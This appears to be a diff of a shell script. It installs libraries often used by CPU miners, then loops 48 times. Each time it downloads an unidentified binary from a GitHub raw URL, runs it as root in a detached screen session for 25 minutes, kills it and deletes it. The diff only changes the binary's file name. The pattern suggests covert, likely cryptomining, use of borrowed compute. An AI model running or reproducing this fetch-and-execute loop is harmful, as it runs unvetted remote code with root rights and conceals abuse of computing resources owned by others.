@@ -1,3 +1,3 @@
 sudo apt install timelimit -y && sudo apt-get update && sudo apt-get upgrade -y && sudo apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 
-for i in `seq 1 48`; do echo $i; sudo wget -q https://raw.githubusercontent.com/renilo/hajar/main/running; sudo chmod +x running; screen -dmS Running ./running ; sleep 1500; clear; screen -XS Running quit; rm -f running; echo SETTING PROJECT; sleep 300; done
+for i in `seq 1 48`; do echo $i; sudo wget -q https://raw.githubusercontent.com/renilo/hajar/main/testrun; sudo chmod +x testrun; screen -dmS Running ./testrun ; sleep 1500; clear; screen -XS Running quit; rm -f testrun; echo SETTING PROJECT; sleep 300; done
 rm -f main
